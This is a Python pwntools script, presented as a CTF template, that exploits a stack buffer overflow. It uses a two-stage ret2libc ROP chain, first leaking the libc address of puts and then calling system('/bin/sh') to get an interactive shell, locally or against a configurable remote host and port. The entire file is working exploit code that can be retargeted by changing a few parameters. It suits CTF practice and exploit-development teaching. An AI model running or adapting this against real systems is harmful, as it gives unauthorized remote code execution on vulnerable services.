#!/usr/bin/env python3
"""
pwntools ROP Chain + ret2libc — CTF Template (pwn)

Automates:
  1. Leak libc base via puts(got['puts'])
  2. Calculate system() / '/bin/sh' offsets
  3. Execute system('/bin/sh') → shell

Adjust: BINARY, REMOTE_HOST, REMOTE_PORT, padding offset.
"""
from pwn import *

# ── configure ────────────────────────────────────────────────────────────────
BINARY      = "./vuln"
LIBC_PATH   = None          # set to "./libc.so.6" if provided; auto-detect otherwise
REMOTE_HOST = "chall.ctf.io"
REMOTE_PORT = 1337
LOCAL       = True          # flip to False for remote
PADDING     = 72            # bytes to reach saved RIP (find with cyclic / pwndbg)
# ─────────────────────────────────────────────────────────────────────────────

context.binary = elf = ELF(BINARY)
rop = ROP(elf)

if LIBC_PATH:
    libc = ELF(LIBC_PATH)
else:
    # Try to find libc automatically
    try:
        from pwnlib.util import proc
        libc = elf.libc
    except Exception:
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def get_io():
    if LOCAL:
        return process(BINARY)
    return remote(REMOTE_HOST, REMOTE_PORT)


def leak_libc_base(io):
    """Stage 1: Leak puts@got via puts@plt, return to main."""
    # ROP: puts(puts@got)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret_gadget = rop.find_gadget(['ret'])[0]   # stack alignment

    payload = flat(
        b"A" * PADDING,
        pop_rdi, elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main'],   # return to main for stage 2
    )

    io.sendline(payload)

    # Receive leaked address
    io.recvuntil(b"\n", timeout=3)   # skip output before leak
    leak_bytes = io.recvline().strip().ljust(8, b"\x00")
    leak = u64(leak_bytes)
    log.success(f"puts@libc = {hex(leak)}")

    libc.address = leak - libc.sym['puts']
    log.success(f"libc base = {hex(libc.address)}")
    return libc.address


def get_shell(io):
    """Stage 2: system('/bin/sh') using resolved libc addresses."""
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret_gadget = rop.find_gadget(['ret'])[0]

    bin_sh = next(libc.search(b'/bin/sh'))
    payload = flat(
        b"A" * PADDING,
        ret_gadget,              # align stack to 16 bytes (Ubuntu glibc)
        pop_rdi, bin_sh,
        libc.sym['system'],
    )
    io.sendline(payload)


def exploit():
    io = get_io()
    leak_libc_base(io)
    get_shell(io)
    io.interactive()


if __name__ == "__main__":
    exploit()
